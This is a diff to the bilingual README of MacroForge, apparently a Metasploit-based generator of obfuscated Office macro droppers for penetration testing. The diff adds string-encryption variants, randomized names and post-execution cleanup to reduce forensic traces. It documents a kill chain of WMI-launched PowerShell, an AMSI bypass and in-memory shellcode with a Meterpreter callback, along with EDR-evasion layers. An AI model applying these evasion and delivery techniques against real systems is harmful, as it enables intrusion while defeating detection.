@@ -1,4 +1,4 @@
-# MacroForge
+# MacroForge v2.0
 
 一款基于 Metasploit 的混淆 VBA 宏 Payload 自动生成器，用于授权渗透测试。一条命令生成分阶段免杀 Office 宏文档，支持 Windows 和 Kali Linux。
 
@@ -6,11 +6,12 @@ An obfuscated VBA macro payload generator built on Metasploit for authorized pen
 
 ## Features 功能
 
-- **Caesar 密码混淆** — 所有敏感字符串编码存储，每次 shift 值随机，绕过静态签名检测
-- **随机化标识符** — 函数名、变量名、临时文件名全部随机生成，每次输出不同
+- **4 种加密方式** — Caesar / XOR / Base64反转 / CharCode 偏移，默认随机选择，每次输出不同签名
+- **全随机化** — 函数名、变量名、临时文件名、分发文件名全部随机生成，每次输出完全不同的签名
 - **WMI 执行** — 通过 `Win32_Process.Create` 启动 PowerShell，断开 Word→PS 父子进程链，绕过 EDR
 - **AMSI 绕过** — 载荷执行前自动 patch AMSI，禁用 PowerShell 内存扫描
 - **分阶段投递** — 文档本身不含 shellcode，仅有混淆下载器；真正的载荷托管在攻击机 HTTP 上
+- **自动清理** — 宏执行完毕后自动删除 %TEMP% 下的 ps1 文件，减少取证痕迹
 - **跨平台** — Windows 和 Kali 自动检测 Metasploit 路径
 - **多种载荷** — `reverse_tcp` / `reverse_https` / `reverse_http` / `shell_tcp`，支持 x86 和 x64
 
@@ -51,7 +52,8 @@ python MacroForge.py --lhost <IP> [options]
                      reverse_tcp | reverse_https | reverse_http | shell_tcp
   --msf-path       Metasploit 路径 (默认自动检测)
   --output-dir     输出目录 (默认当前目录)
-  --shift          Caesar 偏移量 1-5 (默认随机)
+  --method         加密方式: caesar|xor|base64|charcode|random (默认 random)
+  --shift          加密密钥 (默认每种方法自动生成)
   --serve [PORT]   生成后自动启动 HTTP 服务 (可选端口，如 --serve 8081)
   --listen         自动启动 msfconsole 监听 (配合 --serve)
 ```
@@ -60,9 +62,10 @@ python MacroForge.py --lhost <IP> [options]
 
 ```bash
 python MacroForge.py --lhost 10.10.16.7 --payload reverse_https --lport 443
-python MacroForge.py --lhost 10.10.16.7 --arch x86 --shift 3
+python MacroForge.py --lhost 10.10.16.7 --method xor --serve 8081
+python MacroForge.py --lhost 10.10.16.7 --method base64 --arch x86
+python MacroForge.py --lhost 10.10.16.7 --method charcode --shift 100
 python MacroForge.py --lhost 10.10.16.7 --output-dir ./output
-python MacroForge.py --lhost 10.10.16.7 --msf-path /opt/metasploit-framework
 ```
 
 ## Output 输出文件
@@ -70,7 +73,7 @@ python MacroForge.py --lhost 10.10.16.7 --msf-path /opt/metasploit-framework
 | 文件 | 说明 |
 |------|------|
 | `macro.vba` | 混淆 VBA 宏，粘贴到 Word 模块即可 |
-| `rev.ps1` | 含 AMSI 绕过的 PowerShell 载荷，放在 HTTP 服务上 |
+| `<random>.ps1` | 含 AMSI 绕过的 PowerShell 载荷，文件名每次随机，放在 HTTP 服务上 |
 | `handler.rc` | Metasploit 资源文件，`msfconsole -r handler.rc` 一键监听 |
 
 ## Steps 操作步骤
@@ -84,9 +87,10 @@ python MacroForge.py --lhost 10.10.16.7 --msf-path /opt/metasploit-framework
 ## Kill Chain 攻击链
 
 ```
-目标打开 Word → 宏触发 → Caesar 解码后 XMLHTTP 下载 rev.ps1
+目标打开 Word → 宏触发 → 解密函数还原字符串 → XMLHTTP 下载随机命名的 ps1
 → 随机文件名写入 %TEMP% → WMI 启动 PowerShell（父进程为 WMI 非 Word）
 → AMSI bypass → shellcode 内存注入 → Meterpreter 反弹到攻击机
+→ 宏自动删除 %TEMP% 下的 ps1 文件
 ```
 
 ## Evasion 免杀总结
@@ -94,11 +98,12 @@ python MacroForge.py --lhost 10.10.16.7 --msf-path /opt/metasploit-framework
 | 层级 | 技术 |
 |------|------|
 | 文档层 | 无 shellcode，仅含混淆下载器 |
-| 字符串层 | 随机偏移 Caesar 密码编码 |
+| 字符串层 | 4 种加密方式随机切换 (Caesar/XOR/Base64/CharCode) |
 | 标识符层 | 函数名/变量名每次随机 |
 | 执行层 | WMI 创建进程，断开父子链 |
 | PS 层 | 执行前 AMSI bypass |
 | 载荷层 | 内存注入，无文件落地 |
+| 清理层 | 执行后自动删除 ps1，减少取证痕迹 |
 
 ## Disclaimer 免责声明
 
